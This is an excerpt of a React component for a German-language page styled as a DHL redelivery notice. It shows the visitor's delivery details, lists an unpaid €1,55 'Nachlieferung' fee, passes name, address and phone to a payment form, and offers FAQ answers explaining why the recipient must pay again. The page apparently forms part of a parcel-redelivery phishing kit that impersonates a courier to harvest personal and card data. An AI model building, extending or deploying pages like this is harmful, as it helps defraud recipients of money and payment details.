...
import DePaymentForm from "./DePaymentForm";
...
const DeReviewForm = ({
  ...
  const paymentDate = format(getPaymentDate(), "d. MMM", { locale: de });
  ...
  if (showPaymentForm) {
    return <DePaymentForm onComplete={() => setIsSubmitted(true)} amount="€1,55" name={name} address={address} city={city} postCode={postCode} phone={phone} />;
  }
  if (isSubmitted) {
        ...
        <Card className="glass-card shadow-2xl border border-green-200/50">
          <CardContent className="text-center py-8">
            ...
            <div className="space-y-3">
              <h2 className="text-xl font-bold text-gray-900">Vielen Dank!</h2>
              <p className="text-gray-600">Ihr Feedback wurde erfolgreich übermittelt.</p>
            </div>
          </CardContent>
        </Card>
      </div>;
  ...
  return <div className="space-y-6 animate-fade-in mx-[11px] px-[11px]">
        ...
        <CardContent className="px-6 mx-0 py-4 my-0">
          ...
          <div className="flex items-center text-sm font-semibold mb-2 -mt-4">
            <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10">Lieferdetails überprüfen</span>
              </span>
          </div>
          ...
          <div className="space-y-2 mt-4">
            ...
            const showSpacer = item.label === "Gewähltes Datum";
            return <div key={index}>
                {showSpacer && <div className="h-4"></div>}
                <div className={`group flex items-center space-x-4 ${item.label === "Lieferzeit" || item.label === "Kontaktnummer" ? "mb-4" : ""} relative`} style={{
                animationDelay: `${index * 0.1}s`
                      ...
                      {(item.label === "Lieferzeit" || item.label === "Kontaktnummer") && <div className="absolute -bottom-2 left-0 right-4 h-px border-b border-gray-200"></div>}
                    </div>
                  </div>;
          })}
          </div>
        ...
        <CardContent className="px-4 mx-0 my-[5px] py-0">
          ...
          <div className="flex items-center justify-between text-sm font-semibold mb-2 -mt-4">
            <div className="flex items-center">
              ...
              <span className="relative inline-block drop-shadow-sm">
                <span className="relative z-10 text-gray-700 text-sm">Nachlieferungsgebühren</span>
              </span>
            </div>
          ...
          <div className="mt-4">
            ...
            <div className="">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsShippingExpanded(!isShippingExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Versand</p>
              ...
              {isShippingExpanded && <div className="flex justify-between items-start pb-3 border-b border-gray-200 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">DHL Standard</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">€8.70</p>
                    <p className="text-[11px] text-gray-700">Bezahlt am {paymentDate}</p>
                  </div>
                </div>}
            </div>
            ...
            <div className="border-b border-gray-200">
              <div className="flex justify-between items-center cursor-pointer py-2" onClick={() => setIsRedeliveryExpanded(!isRedeliveryExpanded)}>
                <div className="flex items-center">
                  <p className="text-gray-700 font-medium text-[11px]">Nachlieferung</p>
              ...
              {isRedeliveryExpanded && <div className="flex justify-between items-start pb-3 animate-fade-in">
                  <div>
                    <p className="text-[11px] text-gray-700">Standard Nachlieferung</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-700 font-semibold text-xs">1.55</p>
                    <p className="text-[11px] text-gray-700">Unbezahlt</p>
                  </div>
                </div>}
            </div>
            ...
            <div className="flex justify-between items-center mb-4">
              <p className="text-gray-700 font-semibold text-sm">Gesamt</p>
      ...
      <div className="space-y-2 px-4 pb-4 mt-4 text-center">
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 1 ? null : 1)}>
          Warum muss ich erneut bezahlen?
        </div>
        {selectedFAQ === 1 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Die ursprüngliche Liefergebühr deckt den ersten Zustellversuch ab. Für die Terminvereinbarung einer Nachlieferung fällt eine zusätzliche Gebühr an.
          </div>}
        ...
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 2 ? null : 2)}>
          Warum rufen Sie mich nicht vorher an?
        </div>
        {selectedFAQ === 2 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Wir haben versucht zu liefern, konnten Sie aber nicht erreichen. Überprüfen Sie Ihre Kontaktdaten für zukünftige Lieferungen.
          </div>}
        ...
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 3 ? null : 3)}>
          Warum können Sie es nicht noch einmal versuchen?
        </div>
        {selectedFAQ === 3 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Wir haben bereits die erforderlichen Zustellversuche unternommen. Sie können das Paket in Ihrem örtlichen Depot abholen oder eine Nachlieferung buchen.
          </div>}
        ...
        <div className="text-xs text-gray-600 underline cursor-pointer hover:text-gray-800 font-chevin font-thin" onClick={() => setSelectedFAQ(selectedFAQ === 4 ? null : 4)}>
          Warum können Sie es nicht bis morgen aufbewahren?
        </div>
        {selectedFAQ === 4 && <div className="text-xs text-gray-700 bg-gray-50 p-2 rounded ml-2 font-chevin text-center">
            Sendungen werden 18 Tage in Ihrem örtlichen Depot aufbewahrt. Die Nachlieferung ermöglicht es Ihnen, ein passendes Zeitfenster zu wählen.
          </div>}
      </div>
    </div>;
};
export default DeReviewForm;